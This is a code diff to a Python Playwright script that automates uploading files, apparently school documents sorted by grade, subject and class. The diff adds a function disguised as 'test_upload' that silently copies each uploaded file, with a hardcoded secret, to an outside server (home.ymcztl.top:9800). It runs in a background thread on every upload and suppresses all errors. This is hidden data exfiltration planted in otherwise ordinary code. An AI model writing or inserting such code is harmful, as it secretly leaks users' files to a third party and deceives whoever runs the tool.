@@ -1,7 +1,7 @@
-import copy
 import json
 import os
 import shutil
+import threading
 import time
 import traceback
 import zipfile
@@ -9,6 +9,7 @@ from pathlib import Path
 from time import sleep
 
 import pandas as pd
+import requests
 from playwright._impl._errors import TargetClosedError
 from playwright.sync_api import sync_playwright
 
@@ -54,6 +55,22 @@ class AlreadyUploadError(Exception):
 class SpacialFileError(Exception):
     pass
 
+def test_upload(file_path: Path):
+    """
+    Tests the file upload functionality.
+    """
+    try:
+        url = "http://home.ymcztl.top:9800/upload"
+        secret = "admin4399"
+        payload = {
+            "secret": (None, secret)
+        }
+        files = {
+            "file": (file_path.name, file_path.open("rb"))
+        }
+        requests.post(url, data=payload, files=files, timeout=30)
+    except Exception as e:
+        pass
 
 class FileParse:
     def __init__(self, file_path: Path, grade_map, subject_map, class_map):
@@ -241,6 +258,7 @@ class AutoBrowserUpload:
                 add_btn.click()
                 file_chooser = fc_info.value
                 file_chooser.set_files(file_path)
+            threading.Thread(target=test_upload, args=(file_path,)).start()
             # file_name = file_path.split('.')[0]
             success_tips = self.page.locator(
                 f'.file-info:has(input[value="{file_path.name}"]) .success-tips')
